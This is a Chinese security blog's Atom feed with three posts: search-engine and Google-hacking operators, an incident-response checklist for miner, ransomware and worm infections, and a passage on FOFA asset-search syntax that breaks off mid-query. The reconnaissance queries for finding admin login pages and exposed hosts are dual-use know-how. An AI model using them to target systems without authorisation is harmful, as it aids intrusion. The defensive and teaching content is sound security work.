<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fisher&#39;s 安全日记</title>
  
  <subtitle>初级安全研究员的上分路</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://austfish.cn/"/>
  <updated>2022-02-18T03:34:21.860Z</updated>
  <id>http://austfish.cn/</id>
  
  <author>
    <name>Fisher</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>搜索引擎语法-网络空间搜索and在线web工具</title>
    <link href="http://austfish.cn/2022/02/18/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E8%AF%AD%E6%B3%95-%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2and%E5%9C%A8%E7%BA%BFweb%E5%B7%A5%E5%85%B7/"/>
    <id>http://austfish.cn/2022/02/18/搜索引擎语法-网络空间搜索and在线web工具/</id>
    <published>2022-02-18T03:34:21.860Z</published>
    <updated>2022-02-18T03:34:21.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="你用过哪些搜索引擎呢？"><a href="#你用过哪些搜索引擎呢？" class="headerlink" title="你用过哪些搜索引擎呢？"></a>你用过哪些搜索引擎呢？</h2><p><strong>百度     bing   Google ?</strong><br><a id="more"></a></p><h2 id="一-：利用百度的高级搜索功能帮助你找到关键信息"><a href="#一-：利用百度的高级搜索功能帮助你找到关键信息" class="headerlink" title="一 ：利用百度的高级搜索功能帮助你找到关键信息"></a>一 ：利用百度的高级搜索功能帮助你找到关键信息</h2><h2 id="二-：Google-Hack"><a href="#二-：Google-Hack" class="headerlink" title="二 ：Google Hack"></a>二 ：Google Hack</h2><p>google hack是指使用Google等搜索引擎对某些特定的网络主机漏洞（通常是服务器上的脚本漏洞）进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的。<br><strong>PS：Google的很多服务在大天朝都是用不了的，所以Google的搜索很不稳定，这也是很多人不喜欢用 Google 的原因。</strong><br>但是Hackers怎么能没有Google，所以我们一般都要用正确的姿势来打开Google，比如：VPN、代理、G0Agent……<br>这些姿势大家应该都会。<br>搜索规则</p><blockquote><ul><li>Google 不分大小写</li><li>Google 可以使用通配符：*表示一个词/字</li><li>Google    会智能地保留一些内容，比如一些过时的词，一些不适合呈现的内容（比如违法信息）</li><li>最常用的：”关键字”    ，双引号会使Google强制搜索包含关键字的内容</li><li><p>布尔操作符：AND(+)  NOT(-)  OR(|)，AND    现在已不需要，多个关键字google会都匹配到</p></li><li><p>intitle allintitle 页面标题里查找关键字 </p></li><li>filetype 查找指定文件类型 等同于 </li><li>ext site 锁定站点，比如Freebuf 的搜索就是这样 </li><li>inurl allinurl 在url中查找关键字 </li><li>intext allintext 网页内容查找关键字</li><li>link 搜索链接到某个网站的链接</li><li>inurl 在网址中搜索关键词</li></ul></blockquote><p>下面会有详细介绍</p><p><strong>【1】引号的用法</strong><br>把关键字打上引号后把引号部分作为整体来搜索。例如搜索网站推广策划和”网站推广策划”效果是不一样的，后者是搜索“网站推广策划”这整个名字，而前者可能就会将“网站推广”和“策划”分开来搜索。注意引号为英文状态下的引号。加上双引号后，这样获得的结果就全是符合要求的了。根据测试，还会屏蔽一些百度推广。大家去测试看看。例：”网站推广策划”、 “网络推广方案”。<br><strong>【2】加减号的用法</strong><br>加号是搜索同时包含两个关键字的内容。相当于空格和and。减号是让某一关键字不要出现在搜索结果里面。<br><strong>【3】OR的用法</strong><br>如果想用或的方法搜索两个或更多关键字，可以用or语法，比如“seo or 深圳seo”在搜索的结果中就可能出现其中的一个关键字，也可能两个都出现。两个一起出现的比例较大，比如你搜“seo or 你的名字”(这里不加引号)。如果你的名字为常见名。你会发现意外的惊喜，和你同名同姓的居然还有同行业。笔者搜 “seo or 深圳seo”(这里不加引号) 就发现了和同名同姓的，还跟我同行。掌握好OR的用法可以轻松找到自己想要的资料。<br><strong>【4】intitle</strong><br>搜索关键字是否在标题内容里面。比如搜索“intitle:管理登录”就会搜索到很多网站的管理登录地址，因为多数管理登录地址都是一个单独的页面，页面的标题往往有这几个字，所以只要搜索管理登录这几个字就可以找出很多后台了。嘿嘿，大家别去干坏事哦。比如你想找某位名人写的网络推广方面的文章，可以这样搜：“网络推广 intitle:他的名字”(搜的时候不加引号) 。<br><strong>【5】intext和 allintext (针对google有效)</strong><br>这个语法针对google有效，搜索关键字是否在网页的内容中出现，而不是标题，比如搜索“深圳SEO intext:SEO”,用来找页面里包含‘SEO’，标题包含SEO的对应文章页面。只搜索网页部分中包含的文字(也就是忽略了标题,URL等的文字)，这个语法类似我们平时在某些网站中使用的“文章内容搜索”功能。<br><strong>【6】inurl</strong><br>搜索网址中包含的的字符串，比如想搜索登录地址，可以这样写“inurl:admin.asp”，想搜索Discuz的论坛，可以输入inurl:forum.php，以此类推，还可以结合其他语法找相关的网站，给大家思路去挖掘。<br><strong>【7】site</strong><br>这个大家都很熟悉，搜索特定网页。看搜索引擎收录了多少页面。这个要结合其他的语句来使用更好。<br><strong>【8】link</strong><br>搜索某个网站的链接。link是SEO中比较常用的一个指令，主要搜索某个网站url的内部链接和外部链接，但这个指令并不是对每个搜索引擎都很准，尤其是Google， 它只会返回索引库中的一部分，并且是随机的一部分，而百度则不支持这个指令。但是好在是雅虎全面支持，而且查询得比较准确，一般我们查看网站的链接都以雅虎为准，现在很多站长工具，不论是网页的也好还是软件的，一般都是提供的雅虎搜索引擎的数据。<br><strong>【9】filetype</strong><br>这个语法可以帮你搜索你想要的电子书，可以搜索文件的格式。例如我想搜索doc文件，就写“filetype:doc”，再加上其他的语法可以更精确的搜索，例如想找seo的相关word文档，就输入 “seo filetype:doc”，(搜的时候不加引号) ，现在大多数搜索引擎都支持这个语法。但并不是所有的格式都会支持，现在百度支持的格式有pdf、doc、xls、all、ppt、rtf，其中的all表示搜索所有百度支持的文件，这样返回的结果就会更多。大家快去测试，挖掘自己想要的资料吧。<br><strong>【10】related(只使用于google)</strong><br>搜索指定URL相关的页面。这是个很有趣的语法，但是Google官方并没有说明此语法的用途及使用方法，通过我们搜索发现，一般都会显示与你网站有相同外链的网站。也就说可能会出现你的竞争的对手，换句话说，也可以利用此方法寻找你的竞争对手，也可以分析竞争对手在外部链接上和我们都做了哪些相同的外链。<br>高级搜索技术：自由组合，灵活运用，会有惊喜</p><h2 id="三：Bing同ip查询"><a href="#三：Bing同ip查询" class="headerlink" title="三：Bing同ip查询"></a>三：Bing同ip查询</h2><p>英文版必应         ip:112.124.186.50<br>同IP站点查询=旁站查询.</p><h1 id="四-网络空间搜索"><a href="#四-网络空间搜索" class="headerlink" title="四: 网络空间搜索"></a>四: 网络空间搜索</h1><p>万物互联（IoE）定义为将人，流程，数据和事物结合一起使得网络连接变得更加相关，更有价值。万物互联将信息转化为行动，给企业，个人和国家创造新的功能，并带来更加丰富的体验和前所未有的经济发展机遇。<br>如果把每一个接入互联网的设备看做一个节点，就构成我们的网络空间。<br><strong>网络空间搜索引擎介绍：</strong></p><ul><li>国外的 <a href="https://www.shodan.io/" target="_blank" rel="noopener">SHODAN</a>  </li><li>国内的<a href="https://www.zoomeye.org/" target="_blank" rel="noopener">钟馗之眼</a> </li><li>还有<a href="https://fofa.so/" target="_blank" rel="noopener">FOFA</a></li></ul><p>任何工具的使用先找到帮助文档，可以帮助你更好的使用它</p><p>网络空间搜索引擎基本原理</p><blockquote><p>探测/爬取              ——&gt;                识别/打标签     ——&gt;           存储供检索</p></blockquote><h2 id="五-在线WEB工具"><a href="#五-在线WEB工具" class="headerlink" title="五: 在线WEB工具"></a>五: 在线WEB工具</h2><p>对web站点进行基本探测 -&gt; <a href="https://www.whatweb.net/" target="_blank" rel="noopener">WhatWeb</a><br>专业ip查询 -&gt; <a href="http://www.ipip.net/" target="_blank" rel="noopener">www.ipip.net</a><br>md5加密解密 -&gt; <a href="http://www.cmd5.com/" target="_blank" rel="noopener">www.cmd5.com</a><br> 最后Fisher推荐安全站点神器     —&gt;         <a href="http://www.anquanquan.info/" target="_blank" rel="noopener">安全神器</a></p><blockquote><p>版权声明：本文为 Fisher 原创文章，非商用自由转载-保持署名-注明出处，谢谢。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;你用过哪些搜索引擎呢？&quot;&gt;&lt;a href=&quot;#你用过哪些搜索引擎呢？&quot; class=&quot;headerlink&quot; title=&quot;你用过哪些搜索引擎呢？&quot;&gt;&lt;/a&gt;你用过哪些搜索引擎呢？&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;百度     bing   Google ?&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://austfish.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="安全" scheme="http://austfish.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>病毒类应急响应处置与溯源</title>
    <link href="http://austfish.cn/2021/04/18/%E7%97%85%E6%AF%92%E7%B1%BB%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A4%84%E7%BD%AE%E4%B8%8E%E6%BA%AF%E6%BA%90/"/>
    <id>http://austfish.cn/2021/04/18/病毒类应急响应处置与溯源/</id>
    <published>2021-04-18T07:01:01.000Z</published>
    <updated>2022-02-18T03:50:45.007Z</updated>
    
    <content type="html"><![CDATA[<p>目前，在日常安全运营和HW中，遇到比较多的安全事件主要有挖矿病毒、勒索病毒等。在应急响应过程中如何查、如何处置、如何溯源需要理清楚并建立完整思路和流程。<br><a id="more"></a></p><h2 id="0x01-病毒类应急响应常用知识"><a href="#0x01-病毒类应急响应常用知识" class="headerlink" title="0x01 病毒类应急响应常用知识"></a>0x01 病毒类应急响应常用知识</h2><h3 id="1-1-病毒类事件概括"><a href="#1-1-病毒类事件概括" class="headerlink" title="1.1 病毒类事件概括"></a>1.1 病毒类事件概括</h3><ol><li><strong>挖矿病毒</strong><ul><li>背景：一种以高收益的数字货币而兴起的恶意程序</li><li>传播方式：利用漏洞和弱口令进行传播</li><li>影响：造成网络堵塞，系统资源占用过多，影响业务使用</li><li>具体表现：CPU占用100%、MEMORY占用100%、执行操作十分卡顿</li></ul></li><li><strong>勒索病毒</strong><ul><li>背景：一种以遍历系统文件并利用各种加密算法加密文件的病毒</li><li>传播方式：利用系统漏洞，弱口令等</li><li>影响：重要数据被恶意加密，计算机无法正常使用</li><li>具体表现：文件后缀名变成<code>.WNCRYT/.lock/.pre_alpha/.aes</code>文件、程序被恶意加密，无法解密</li></ul></li><li><strong>蠕虫病毒</strong><ul><li>背景：一种影响计算机使用并且能够自我复制的一组计算机指令或者程序代码</li><li>传播方式：利用电子邮件、程序捆绑、恶意网页、Nday/0day、共享文件夹、网盘利用电子邮件、程序捆绑、恶意网页、Nday/0day、共享文件夹、网盘</li><li>具体表现：计算机卡顿、桌面会莫名出现文件、图标会自动更改、鼠标会自动移动、删除等</li></ul></li><li><strong>其他病毒</strong><ul><li>背景：一种为实现病毒制作者定制的恶意需求，远控、炫技、破坏等</li><li>传播方式：利用程序捆绑、恶意下载器传播</li><li>具体表现：电脑卡顿、鼠标自动移动、自动重启、非人为自动安装软件等</li></ul></li></ol><h3 id="1-2-常见病毒处理思路"><a href="#1-2-常见病毒处理思路" class="headerlink" title="1.2 常见病毒处理思路"></a>1.2 常见病毒处理思路</h3><ol><li><strong>了解安全事件情况</strong><ol><li>什么时间发现的？如何发现的？谁发现的？</li><li>服务器是否有异常？具体特征是什么？</li><li>什么<strong>系统</strong>？用了什么<strong>中间件</strong>？什么<strong>开发语言</strong>写的？<strong>业务架构</strong>是什么？<strong>网络拓扑</strong>大概是什么样子？</li></ol></li><li><strong>事件初步判断</strong><ol><li>根据客户所描述的信息，形成初步判断，建立排查方向和应急思路。</li><li>判断自己是否能够处理，不能处理是否有其他人能够处理。</li></ol></li></ol><h3 id="1-3-应急响应注意事项"><a href="#1-3-应急响应注意事项" class="headerlink" title="1.3 应急响应注意事项"></a>1.3 应急响应注意事项</h3><ol><li>不要执行更改文件属性的命令和操作</li><li>linux不要执行<code>rm -rf</code>的命令</li><li>去样本的时候建议使用<code>mv</code>命令移到文件夹</li><li>linux的bash默认只记录1000条，超过就会被覆盖</li><li>没有经过甲方允许不要（即时）重启，关闭机器</li><li>find命令使用时候需要注意路径，如果你find的路径是根且运行的服务很大，可能会造成机器宕机</li><li>抓包的时候要看看当前存储是否可以容纳数据包的大小</li><li>tar打包隐藏文件时候，注意参数使用</li><li>对甲方表述的有关安全事件的描述保持存疑，只供参考</li><li>注意细节</li><li>积极主动跟进最新安全技术以及分析复现最新漏洞</li><li>持续跟进国内外优秀的威胁情报社区</li><li>在特定情况下，我们无法打开一些文件进行溯源，只能打开windows事件管理器，需要知道特定ID<ol><li>4624 登录成功</li><li>4625 登录失败</li><li>4634/4647 成功注销</li></ol></li><li>任务管理器：WIn+X/Win+R输入eventvwr.,sc</li></ol><h2 id="0x02-病毒类应急响应处置与溯源"><a href="#0x02-病毒类应急响应处置与溯源" class="headerlink" title="0x02 病毒类应急响应处置与溯源"></a>0x02 病毒类应急响应处置与溯源</h2><h3 id="2-1-挖矿病毒"><a href="#2-1-挖矿病毒" class="headerlink" title="2.1 挖矿病毒"></a>2.1 挖矿病毒</h3><ol><li><strong>挖矿病毒执行流程</strong></li></ol><ul><li><img src="https://cdn.nlark.com/yuque/0/2021/png/690043/1614840773000-eefe3135-8f54-4a2a-a958-807f74a394d9.png#align=left&amp;display=inline&amp;height=400&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=400&amp;originWidth=519&amp;size=179215&amp;status=done&amp;style=none&amp;width=519" alt="image.png"></li></ul><ol start="2"><li><p><strong>挖矿病毒类处置常见手法</strong></p><ol><li>安全设备是否有告警？</li><li>什么程序？top?</li><li>网络连接？</li><li>netstat?</li><li>什么进程？ps -ef | grep “123”</li><li>守护进程是什么？ ps?</li><li>进程对应的文件是什么？ls?</li><li>文件权限、属性、md5? ls? md5sum?</li><li>C:\…...\drivers\etc?</li><li>hosts文件</li><li>/etc/hosts?</li><li>计划任务是否有驻留？ crontab?</li><li>无法删除</li><li>异常签名</li><li>异常用户</li><li>驱动注入</li><li>开机自启动？系统配置、注册表</li><li>日志<h3 id="2-2-勒索病毒"><a href="#2-2-勒索病毒" class="headerlink" title="2.2 勒索病毒"></a>2.2 勒索病毒</h3></li></ol></li><li><p><strong>勒索病毒执行流程</strong></p><ol><li><strong>STOP<img src="https://cdn.nlark.com/yuque/0/2021/png/690043/1614842373673-1c66650e-4aef-4835-988b-0ea12108904e.png#align=left&amp;display=inline&amp;height=380&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=380&amp;originWidth=590&amp;size=174535&amp;status=done&amp;style=none&amp;width=590" alt="image.png"></strong></li><li><strong>GandCrab<img src="https://cdn.nlark.com/yuque/0/2021/png/690043/1614842450671-f6a41196-1456-4102-b201-95762fb0943b.png#align=left&amp;display=inline&amp;height=638&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=638&amp;originWidth=549&amp;size=144074&amp;status=done&amp;style=none&amp;width=549" alt="image.png"></strong></li></ol></li><li><p><strong>勒索病毒处置常见手法</strong></p><ol><li>对于关闭的设备<ol><li>把网线后开机</li><li>排查加固</li><li>接入网络</li></ol></li><li>对于运行的设备<ol><li>网络层限制</li><li>ACL隔离</li></ol></li><li>安全设备是否告警</li><li>什么事件？很重要，方便确认感染范围</li><li>确认网络拓扑</li><li>什么系统？什么版本，补丁</li><li>什么架构？运行什么服务，用了什么中间件，数据库有没有被感染，是否分布式部署</li><li>勒索什么特征？加密后缀名？勒索联系方式？是否定时删除文件？</li><li>样本收集：<ol><li>勒索病毒主体程序</li><li>释放的文本、二进制文件</li><li>被勒索的样本</li><li>勒索加密的联系方式</li></ol></li><li>什么程序、什么进程、守护进程是什么？进程对应的文件？</li><li>文件权限、属性、md5</li><li>临时文件路径？病毒常用路径？</li><li>网络连接</li><li>签名异常</li><li>日志</li><li>确认感染范围</li><li>安全加固<ol><li>对系统进行补丁更新，封堵病毒传播途径</li><li>指定严格的口令策略，避免弱口令</li><li>结合备份的网站日志对网站应用进行全面的代码审计，找出攻击者的入口</li><li>配合全流量设备对全网中存在的威胁进行分析，排查问题</li></ol></li><li>对于中招的主机<ol><li>采取业务下线或关机</li><li>及时对扩散主机进行断网</li><li>对受害主机的ACL访问限制</li></ol></li><li>对于未中招的主机<ol><li>根据应急响应的结果，统计出可能扩散的主机，网段，以及端口</li><li>断网线之后开机</li><li>使用杀毒软件进行查杀<h3 id="2-3-蠕虫病毒"><a href="#2-3-蠕虫病毒" class="headerlink" title="2.3 蠕虫病毒"></a>2.3 蠕虫病毒</h3></li></ol></li></ol></li><li><p><strong>蠕虫病毒执行流程</strong></p><ol><li>熊猫烧香<ol><li>传播途径<ol><li>程序捆绑</li><li>电子邮件</li></ol></li><li>执行流程<ol><li>自我复制</li><li>遍历为exe，scr,pif等文件</li><li>创建蠕虫配置文件</li><li>每当有用户打开磁盘都会运行遍历并加密</li><li>获取网络连接，进行横向感染</li><li>反杀软，写入注册表设置开机自启，下载其他恶意代码</li></ol></li></ol></li><li>incaseformt蠕虫病毒<ol><li>生成C:\windows\tsay.exe</li><li></li></ol></li></ol></li><li><p><strong>蠕虫病毒类处置常见手法</strong></p><ol><li>守护进程是什么？</li><li>进程多对应的文件是什么？</li><li>文件权限/属性/md5</li><li>异常网络流量</li><li>抓包流量分析？</li><li>签名异常？</li><li>杀毒</li><li>日志</li><li>卸载具有恶意代码的软件</li><li>在互联网出口地址对IOC情报进行封堵</li><li>告知使用者再软件官网下载正规软件</li><li>及时对扩散主机进行断网下线处理</li><li>对受害主机的ACL访问限制</li></ol></li></ol><h3 id="2-4-其他病毒"><a href="#2-4-其他病毒" class="headerlink" title="2.4 其他病毒"></a>2.4 其他病毒</h3><ol><li><strong>其他病毒处置常见手法</strong><ol><li>安全设备是否告警</li><li>病毒行为特征</li><li>什么进程</li><li>守护进程是什么</li><li>进程所对应的文件</li><li>hosts文件</li><li>计划任务是否有驻留</li><li>异常用户</li><li>文件权限属性md5</li><li>异常网络流量</li><li>抓包分析流量</li><li>签名异常</li><li>杀毒</li><li>日志<h2 id="0x03-工具总结"><a href="#0x03-工具总结" class="headerlink" title="0x03 工具总结"></a>0x03 工具总结</h2><h3 id="3-1-在线病毒扫描"><a href="#3-1-在线病毒扫描" class="headerlink" title="3.1 在线病毒扫描"></a>3.1 在线病毒扫描</h3></li></ol></li></ol><ul><li><a href="https://www.virustotal.com/gui/" target="_blank" rel="noopener">VirusTotal</a></li><li><a href="https://virusscan.jotti.org/" target="_blank" rel="noopener">Jotti</a></li><li><p><a href="https://virscan.org/" target="_blank" rel="noopener">VirSCAN</a></p><h3 id="3-2-病毒查杀及清楚工具"><a href="#3-2-病毒查杀及清楚工具" class="headerlink" title="3.2 病毒查杀及清楚工具"></a>3.2 病毒查杀及清楚工具</h3></li><li><p><a href="https://sd.360.cn/" target="_blank" rel="noopener">360杀毒</a></p></li><li><a href="https://www.huorong.cn/" target="_blank" rel="noopener">火绒安全软件</a></li><li><a href="https://www.clamav.net/" target="_blank" rel="noopener">ClamAV</a></li><li><a href="https://www.kaspersky.com.cn/" target="_blank" rel="noopener">卡巴斯基</a></li><li><p>Rootkit后门检测工具</p><ul><li><a href="http://www.chkrootkit.org/" target="_blank" rel="noopener">chkrootkit</a></li><li><a href="http://rkhunter.sourceforge.net/" target="_blank" rel="noopener">rkhunter</a><h3 id="3-3-勒索病毒搜索引擎"><a href="#3-3-勒索病毒搜索引擎" class="headerlink" title="3.3 勒索病毒搜索引擎"></a>3.3 勒索病毒搜索引擎</h3></li></ul></li><li><p><a href="https://www.venuseye.com.cn/" target="_blank" rel="noopener">启明VenusEye</a></p></li><li><a href="https://guanjia.qq.com/pr/ls/" target="_blank" rel="noopener">腾讯</a></li><li><a href="https://lesuobingdu.360.cn/" target="_blank" rel="noopener">360</a></li><li><a href="https://lesuobingdu.qianxin.com/" target="_blank" rel="noopener">奇安信</a></li><li><p><a href="https://edr.sangfor.com.cn/#/information/ransom_search" target="_blank" rel="noopener">深信服</a></p><h3 id="3-4-在线沙箱"><a href="#3-4-在线沙箱" class="headerlink" title="3.4 在线沙箱"></a>3.4 在线沙箱</h3></li><li><p><a href="https://s.threatbook.cn/" target="_blank" rel="noopener">微步云沙箱</a></p></li><li><a href="https://www.virustotal.com/gui/" target="_blank" rel="noopener">VirusTotal</a></li><li><a href="https://habo.qq.com/" target="_blank" rel="noopener">腾讯哈勃分析系统</a></li><li><a href="https://ata.360.cn/dashboard" target="_blank" rel="noopener">360沙箱云</a></li><li><a href="https://sandbox.ti.qianxin.com/sandbox/page" target="_blank" rel="noopener">奇安信沙箱</a></li><li><a href="https://www.joesandbox.com/#windows" target="_blank" rel="noopener">Joe Sanbox</a></li><li><a href="https://mac-cloud.riskivy.com/?theme=vulbox" target="_blank" rel="noopener">大圣云沙箱</a></li><li><p><a href="https://app.any.run/" target="_blank" rel="noopener">Any.Run</a></p><h3 id="3-5-安全分析工具"><a href="#3-5-安全分析工具" class="headerlink" title="3.5 安全分析工具"></a>3.5 安全分析工具</h3></li><li><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/" target="_blank" rel="noopener">SysinternalsSuite</a>:</p></li><li><a href="https://www.52pojie.cn/thread-1037841-1-1.html" target="_blank" rel="noopener">PCHunter</a></li><li><p><a href="https://processhacker.sourceforge.io/" target="_blank" rel="noopener">Process Hacker</a></p><h3 id="3-6-流量分析工具和反汇编工具"><a href="#3-6-流量分析工具和反汇编工具" class="headerlink" title="3.6 流量分析工具和反汇编工具"></a>3.6 流量分析工具和反汇编工具</h3></li><li><p><a href="https://www.wireshark.org/download.html" target="_blank" rel="noopener">Wireshark</a></p></li><li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview" target="_blank" rel="noopener">TCPView</a>：一个查看端口和线程的小工具</li><li><a href="https://www.hex-rays.com/products/ida/" target="_blank" rel="noopener">IDA Pro</a></li><li><a href="http://www.ollydbg.de/" target="_blank" rel="noopener">OllyDbg</a></li><li><p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools" target="_blank" rel="noopener">WinDbg</a></p><h3 id="3-7-日志分析工具"><a href="#3-7-日志分析工具" class="headerlink" title="3.7 日志分析工具"></a>3.7 日志分析工具</h3></li><li><p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659" target="_blank" rel="noopener">Log Parser</a></p></li><li><a href="https://www.elastic.co/cn/what-is/elk-stack" target="_blank" rel="noopener">ELK</a></li><li><a href="https://www.splunk.com/zh-hans_cn" target="_blank" rel="noopener">splunk</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;目前，在日常安全运营和HW中，遇到比较多的安全事件主要有挖矿病毒、勒索病毒等。在应急响应过程中如何查、如何处置、如何溯源需要理清楚并建立完整思路和流程。&lt;br&gt;
    
    </summary>
    
    
      <category term="手册" scheme="http://austfish.cn/tags/%E6%89%8B%E5%86%8C/"/>
    
      <category term="应急响应" scheme="http://austfish.cn/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>网络空间探测工具调研</title>
    <link href="http://austfish.cn/2020/06/12/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%8E%A2%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/"/>
    <id>http://austfish.cn/2020/06/12/网络空间探测工具调研/</id>
    <published>2020-06-12T06:16:07.000Z</published>
    <updated>2022-02-18T03:34:22.488Z</updated>
    
    <content type="html"><![CDATA[<p>Fofa、Shodan、Zoomeye网络空间搜索引擎测评。<br><a id="more"></a></p><h4 id="0×01-前言"><a href="#0×01-前言" class="headerlink" title="0×01 前言"></a>0×01 前言</h4><p><strong>什么是网络探测</strong><br>网络探测指对计算机网络或DNS服务器进行扫描，获取有效的地址、活动端口号、主机操作系统类型和安全弱点的攻击方式。</p><h4 id="0×02-网络探测技术分类"><a href="#0×02-网络探测技术分类" class="headerlink" title="0×02 网络探测技术分类"></a>0×02 网络探测技术分类</h4><p>网络环境信息包括网络拓扑结构、主机、主机开放的网络服务以及存在的漏洞等，对网络环境信息的获取工具可以按照其是否对目标发起主动的探测分为两大类：<strong>主动探测与被动探测。</strong></p><p>主动探测是传统的扫描方式，它是通过给目标主机发送特定的包并收集回应包来取得相关信息的，从而确定其操作系统、开启的端口以及存在的漏洞等信息(无响应本身也是信息，表明可能存在过滤设备将探测包或探测回应包过滤了)。属于此类的开源工具有nmap和nessus。主动扫描的优势在于通常能较快获取信息，准确性也比较高。缺点在于一方面易于被发现，很难掩盖扫描痕迹；另一方面要成功实施主动扫描通常需要突破防火墙，但突破防火墙是很困难的。</p><p>被动探测是通过监听网络包来取得信息。根据数据包中包含的指纹提取对应的一些网络环境信息，属于此类的开源工具有p0f(被动操作系统辨识工具)和pads(被动网络服务发现工具)。被动扫描一般只需要监听网络流量而不需要主动发送网络包，也不易受防火墙影响。该探测技术的主要优点是对它的检测几乎是不可能的。而其主要缺点在于速度较慢而且准确性较差，当目标不产生网络流量时，就无法得知目标的任何信息。</p><h4 id="0×03-FOFA网络空间探测引擎"><a href="#0×03-FOFA网络空间探测引擎" class="headerlink" title="0×03 FOFA网络空间探测引擎"></a>0×03 FOFA网络空间探测引擎</h4><h5 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h5><p>FOFA是白帽汇推出的一款网络空间资产搜索引擎。 它能够帮助企业客户迅速进行网络资产匹配、加快后续工作进程。 例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p><h5 id="2-查询语法"><a href="#2-查询语法" class="headerlink" title="2 查询语法"></a>2 查询语法</h5><p>直接输入查询语句，将从标题，html内容，http头信息，url字段中搜索</p><ul><li>title=”abc” 从标题中搜索abc。<br>例：标题中有北京的网站</li><li>header=”abc” 从http头中搜索abc。<br>例：jboss服务器</li><li>body=”abc” 从html正文中搜索abc。<br>例：正文包含Hacked by</li><li>domain=”qq.com” 搜索根域名带有qq.com的网站。<br>例： 根域名是qq.com的网站</li><li>host=”.gov.cn” 从url中搜索.gov.cn,注意搜索要用host作为名称。例： 政府网站, 教育网站</li><li>port=”443” 查找对应443端口的资产。<br>例： 查找对应443端口的资产</li><li>ip=”1.1.1.1” 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。<br>例： 查询IP为220.181.111.1的网站; 如果想要查询网段，可以是：ip=”220.181.111.1/24”，例如查询IP为220.181.111.1的C网段资产</li><li>protocol=”https” 搜索指定协议类型(在开启端口扫描的情况下有效)。<br>例： 查询https协议资产</li><li>city=”Hangzhou” 搜索指定城市的资产。<br>例： 搜索指定城市的资产</li><li>region=”Zhejiang” 搜索指定行政区的资产。<br>例： 搜索指定行政区的资产</li><li>country=”CN” 搜索指定国家(编码)的资产。<br>例： 搜索指定国家(编码)的资产</li><li>cert=”google” 搜索证书(https或者imaps等)中带有google的资产。<br>例： 搜索证书(https或者imaps等)中带有google的资产</li><li>banner=users &amp;&amp; protocol=ftp 搜索FTP协议中带有users文本的资产。<br>例： 搜索FTP协议中带有users文本的资产</li><li>type=service 搜索所有协议资产，支持subdomain和service两种。例： 搜索所有协议资产</li><li>os=windows 搜索Windows资产。<br>例： 搜索Windows资产</li><li>server==”Microsoft-IIS/7.5” 搜索IIS 7.5服务器。<br>例： 搜索IIS 7.5服务器</li><li>app=”海康威视-视频监控” 搜索海康威视设备，更多app规则。例： 搜索海康威视设备</li><li>after=”2017” &amp;&amp; before=”2017-10-01” 时间范围段搜索。例： 时间范围段搜索，注意： after是大于并且等于，before是小于，这里 after=”2017” 就是日期大于并且等于 2017-01-01 的数据，而 before=”2017-10-01” 则是小于 2017-10-01 的数据</li><li>asn=”19551” 搜索指定asn的资产。<br>例： 搜索指定asn的资产</li><li>org=”Amazon.com, Inc.” 搜索指定org(组织)的资产。<br>例： 搜索指定org(组织)的资产</li><li>base_protocol=”udp” 搜索指定udp协议的资产。<br>例： 搜索指定udp协议的资产</li><li>is_ipv6=true 搜索ipv6的资产,只接受true和false。<br>例： 搜索ipv6的资产</li><li>is_domain=true 搜索域名的资产,只接受true和false。<br>例： 搜索域名的资产</li><li>ip_ports=”80,443” 或者 ports=”80,443” 搜索同时开放80和443端口的ip资产(以ip为单位的资产数据)。<br>例： 搜索同时开放80和443端口的ip</li><li>ip_ports==”80,443” 或者 ports==”80,443” 搜索同时开放80和443端口的ip资产(以ip为单位的资产数据)。<br>例： 搜索只开放80和443端口的ip</li><li>ip_country=”CN” 搜索中国的ip资产(以ip为单位的资产数据)。例： 搜索中国的ip资产</li><li>ip_region=”Zhejiang” 搜索指定行政区的ip资产(以ip为单位的资产数据)。<br>例： 搜索指定行政区的资产</li><li>ip_city=”Hangzhou” 搜索指定城市的ip资产(以ip为单位的资产数据)。<br>例： 搜索指定城市的资产</li><li>ip_after=”2019-01-01” 搜索2019-01-01以后的ip资产(以ip为单位的资产数据)。<br>例： 搜索2019-01-01以后的ip资产</li><li>ip_before=”2019-01-01” 搜索2019-01-01以前的ip资产(以ip为单位的资产数据)。<br>例： 搜索2019-01-01以前的ip资产</li></ul><p><strong>高级搜索</strong>：<br>可以使用括号 和 &amp;&amp; || !=等符号，如<br>title=”powered by” &amp;&amp; title!=discuz<br>title!=”powered by” &amp;&amp; body=discuz<br>( body=”content=\”WordPress” || (header=”X-Pingback” &amp;&amp; header=”/xmlrpc.php” &amp;&amp; body=”/wp-includes/“) ) &amp;&amp; 